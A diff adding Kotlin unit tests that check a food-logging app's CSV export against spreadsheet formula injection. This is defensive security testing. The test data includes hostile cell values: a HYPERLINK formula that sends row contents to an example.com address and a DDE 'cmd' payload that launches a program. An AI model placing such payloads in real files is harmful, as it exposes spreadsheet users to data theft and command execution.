@@ -219,4 +219,79 @@ class EntryCsvTest {
         assertNotNull(decoded[0])
         assertEquals(Confidence.ESTIMATED, decoded[0].confidence)
     }
+
+    // ---- CSV injection (security review, 2026-11-04) ---------------------------
+    //
+    // What broke: text cells went out as-is, so a food name starting with = + - @
+    // (typed, spoken, or from the AI or Open Food Facts) ran as a formula when the
+    // export was opened in Excel or Sheets. =HYPERLINK(...) can send the row's
+    // contents to a web address. The fix: EntryCsv.guard puts a ' in front of any
+    // text cell that could start a formula, and decode takes it off again.
+    // If one of these fails: check that encode uses text(), not escape(), for every
+    // free-text column, and that decode reads those columns through unguard.
+
+    private val dangerous = listOf(
+        "=HYPERLINK(\"https://example.com/?\"&A2,\"x\")",
+        "+1+1",
+        "-2+3",
+        "@SUM(A1:A9)",
+        "\t=1+1",
+        "=cmd|' /C calc'!A0",
+    )
+
+    /** The cells of the first data row, as a spreadsheet would see them. */
+    private fun firstRowCells(csv: String): Map<String, String> {
+        val records = EntryCsv.splitRecords(csv)
+        return records[0].zip(records[1]).toMap()
+    }
+
+    @Test
+    fun `csv export neutralises formula cells in every free text column`() {
+        for (bad in dangerous) {
+            val csv = EntryCsv.encode(listOf(entry(id = bad, raw = bad, name = bad, source = bad)), zone)
+            val cells = firstRowCells(csv)
+            for (column in listOf("id", "raw_text", "name", "source")) {
+                val cell = cells.getValue(column)
+                assertTrue("$column cell <$cell> could run as a formula", cell.first() !in "=+-@\t\r")
+                assertEquals("$column should be the value behind a single quote", "'$bad", cell)
+            }
+        }
+    }
+
+    @Test
+    fun `formula looking names still round trip exactly`() {
+        val names = dangerous + listOf("'", "''", "'quoted'", "'=already guarded", "-", "=", "plain", "")
+        val original = names.mapIndexed { i, n -> entry(id = "id-$i", raw = n, name = n, source = n) }
+        assertEquals(original, EntryCsv.decode(EntryCsv.encode(original, zone)))
+    }
+
+    @Test
+    fun `ordinary names are not touched by the formula guard`() {
+        val cells = firstRowCells(EntryCsv.encode(listOf(entry(name = "Greek yogurt, 2% (170 g)")), zone))
+        assertEquals("Greek yogurt, 2% (170 g)", cells.getValue("name"))
+        assertEquals("Greek yogurt", EntryCsv.guard("Greek yogurt"))
+        
+    }
+
+    @Test
+    fun `a leading quote in an export made before the guard is kept on import`() {
+        // Old exports had no guard, so a name that really starts with ' must not lose it.
+        val old = EntryCsv.HEADER + "\nid-1,1789797747092,,false,false,'Nduja,'Nduja pizza,10.0,,,,,,,,,false,manual,STATED"
+        val decoded = EntryCsv.decode(old)
+        assertEquals("'Nduja", decoded[0].rawText)
+        assertEquals("'Nduja pizza", decoded[0].name)
+    }
+
+    @Test
+    fun `numbers are not guarded so negative values stay numeric`() {
+        // Only text columns are guarded; a number column must stay a number.
+        val cells = firstRowCells(EntryCsv.encode(listOf(entry(protein = 17.0)), zone))
+        assertEquals("17.0", cells.getValue("protein_grams"))
+    }
+
+    @Test
+    fun `a lone carriage return in a name no longer splits the row`() {
+        val original = listOf(entry(name = "line one\rline two"))
+        assertEquals(original, EntryCsv.decode(EntryCsv.encode(original, zone)))
+    }
 }
